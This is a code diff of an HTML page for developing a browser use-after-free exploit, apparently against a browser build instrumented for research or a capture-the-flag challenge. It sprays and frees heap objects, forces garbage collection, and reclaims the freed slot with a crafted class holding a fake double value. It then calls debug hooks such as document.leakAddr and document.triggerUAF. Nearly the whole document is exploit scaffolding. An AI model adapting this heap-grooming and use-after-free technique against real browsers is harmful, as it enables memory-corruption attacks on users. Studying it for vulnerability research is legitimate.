@@ -2,50 +2,89 @@
 <iframe id="frame" src=""></iframe>
 <br>
 <button onclick="query()">Query</button>
-<button onclick="alloc()">Alloc</button>
+<button onclick="alloc_uaf()">Alloc</button>
 <button onclick="gc()">gc</button>
 <button onclick="spray()">Spray</button>
 <button onclick="multiple_alloc()">Alloc multi</button>
+<button onclick="trigger()">Trigger</button>
 <script>
-var audioContext;
-var analyserNode;
 var barrier = [];
 var holes = [];
+var optimize = [];
+
+class X {
+    constructor() {
+	this.a = 16,
+	this.b = 15,
+	this.c = 14,
+	this.d = 13,
+	this.e = 12,
+	this.f = 11,
+	this.g = 1.0979406219841964e-303,
+	this.h = 9,
+	this.i = 8,
+	this.j = 7,
+	this.k = 6,
+	this.l = 5,
+	this.m = 4,
+	this.n = 3,
+	this.o = 2,
+	this.p = 1
+    }
+}
 
 function spray() {
-    for (let i = 0; i < 248; ++i) {
+    for (let i = 0; i < 247; ++i) {
 	barrier.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
     }
 
     let tmp1 = [];
     for (let j = 0; j < 4; ++j) {
 	let tmp_arr = [];
+	let numIter = 250;
+	if (j == 0) {
+	    numIter = 249;
+	    tmp_arr.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
+	}
 	tmp1.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
-	for (let i = 0; i < 250; ++i) {
+	for (let i = 0; i < numIter; ++i) {
 	    tmp_arr.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
 	}
 	holes.push(tmp_arr);
     }
     for (let i = 0; i < tmp1.length; ++i)
-	analyserNode.angel_func(tmp1[i]);
+	document.leakAddr(tmp1[i]);
     for (let i = 0; i < tmp1.length; ++i)
 	tmp1[i] = undefined;
     gc();
     query();
 }
 
-var new_objs = [];
-function alloc() {
+var uaf_obj;
+function alloc_uaf() {
     let tmp = {a: "a", b: "b", c: "c", d: "d", e: "e"};
-    new_objs.push(tmp);
-    analyserNode.angel_func(tmp);
+    document.cloneObj(tmp);
 }
 
+var reclaim;
+function trigger() {
+    holes[0] = undefined;
+    gc();
+    document.leakState();
+    reclaim = new X();
+    document.leakAddr(reclaim);
+    setTimeout(function() {
+        gc();
+	alert(document.triggerUAF(reclaim));
+    }, 1000);
+}
+
+var new_objs = [];
 function multiple_alloc() {
     for (let i = 0; i < 4; ++i) {
 	let tmp = {a: "a", b: "b", c: "c", d: "d", e: "e"};
 	new_objs.push(tmp);
-	analyserNode.angel_func(tmp);
+	document.leakAddr(tmp);
     }
 }
 
@@ -54,16 +93,8 @@ function gc() {
 }
 
 function query() {
-    analyserNode.evil_func();
+    document.leakState();
 }
-
-try {
-    audioContext = new AudioContext();
-} catch(e) {
-    alert('Web Audio API is not supported in this browser');
-}
-
-analyserNode = audioContext.createAnalyser();
 
 </script>
 </body>
